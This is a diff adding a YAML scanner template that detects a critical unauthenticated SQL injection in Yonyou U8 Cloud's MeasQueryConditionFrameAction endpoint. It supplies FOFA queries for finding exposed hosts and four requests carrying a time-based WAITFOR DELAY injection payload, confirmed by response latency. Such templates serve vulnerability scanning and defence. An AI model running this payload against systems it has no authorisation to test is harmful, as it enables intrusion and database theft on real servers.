@@ -1,0 +1,42 @@
+id: yongyou-U8-cloud-MeasQueryConditionFrameAction-sqli
+
+info:
+  name: 用友U8-Cloud系统接口MeasQueryConditionFrameAction存在SQL注入漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    用友U8 Cloud MeasQueryConditionFrameAction接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    fofa：app="用友-U8-Cloud"
+    Fofa: title=="U8C"
+  reference:
+    - https://github.com/Sec-Fork/POC-20240918/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3MeasQueryConditionFrameAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: 用友U8,sqli
+  created: 2025/01/22
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--+
+    expression: |
+      response.status == 200 && response.latency <= 7000 &&  response.latency >= 5000
+  r1:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:10%27--+
+    expression: |
+      response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+  r2:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--+
+    expression: |
+      response.status == 200 && response.latency <= 7000 &&  response.latency >= 5000
+  r3:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:10%27--+
+    expression: |
+      response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+expression: r0() && r1() && r2() && r3()
